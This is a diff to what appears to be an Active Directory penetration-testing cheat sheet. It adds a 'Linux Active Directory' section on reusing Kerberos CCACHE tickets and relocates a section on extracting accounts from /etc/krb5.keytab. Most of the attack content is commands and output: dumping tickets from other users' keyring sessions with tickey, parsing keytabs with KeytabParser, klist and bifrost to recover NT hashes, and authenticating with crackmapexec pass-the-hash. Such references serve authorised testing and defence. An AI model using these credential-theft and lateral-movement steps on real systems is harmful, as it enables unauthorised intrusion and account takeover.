@@ -56,9 +56,13 @@
     - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
-    - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
+  - [Linux Active Directory](#linux-active-directory)
+    - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
+    - [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
+    - [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
+    - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
   - [References](#references)
 
 ## Tools
@@ -1173,38 +1177,6 @@ python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d 
 python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
 
-
-### Extract accounts from /etc/krb5.keytab
-
-The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
-
-Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
-
-```powershell
-$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
-[...]
-[26] Service principal: host/COMPUTER@DOMAIN
-	 KVNO: 25
-	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
-	 Time stamp: Oct 07,  2019 09:12:02
-[...]
-```
-
-On macOS you can use `bifrost`.
-
-```powershell
-./bifrost -action dump -source keytab -path test
-```
-
-Connect to the machine using the account and the hash with CME.
-
-```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
-```
-
-
 ### PXE Boot image attack
 
 PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.
@@ -1290,6 +1262,73 @@ network.negotiate-auth.trusted-uris="https://aadg.windows.net.nsatc.net,https://
 ```
 
 Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.
+
+
+## Linux Active Directory
+
+### CCACHE ticket reuse from /tmp
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`
+
+> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+### CCACHE ticket reuse from keyring
+
+Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
+
+```powershell
+[root@Lab-LSV01 /]# /tmp/tickey -i
+[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
+[+] root detected, so... DUMP ALL THE TICKETS!!
+[*] Trying to inject in tarlogic[1000] session...
+[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
+[*] Trying to inject in velociraptor[1120601115] session...
+[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
+[*] Trying to inject in trex[1120601113] session...
+[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
+[X] [uid:0] Error retrieving tickets
+```
+
+### CCACHE ticket reuse from keytab
+
+```powershell
+git clone https://github.com/its-a-feature/KeytabParser
+python KeytabParser.py /etc/krb5.keytab
+klist -k /etc/krb5.keytab
+```
+
+### Extract accounts from /etc/krb5.keytab
+
+The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
+
+Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
+
+```powershell
+$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
+[...]
+[26] Service principal: host/COMPUTER@DOMAIN
+	 KVNO: 25
+	 Key type: 23
+	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Time stamp: Oct 07,  2019 09:12:02
+[...]
+```
+
+On macOS you can use `bifrost`.
+
+```powershell
+./bifrost -action dump -source keytab -path test
+```
+
+Connect to the machine using the account and the hash with CME.
+
+```powershell
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+```
+
+
+
 
 ## References
 
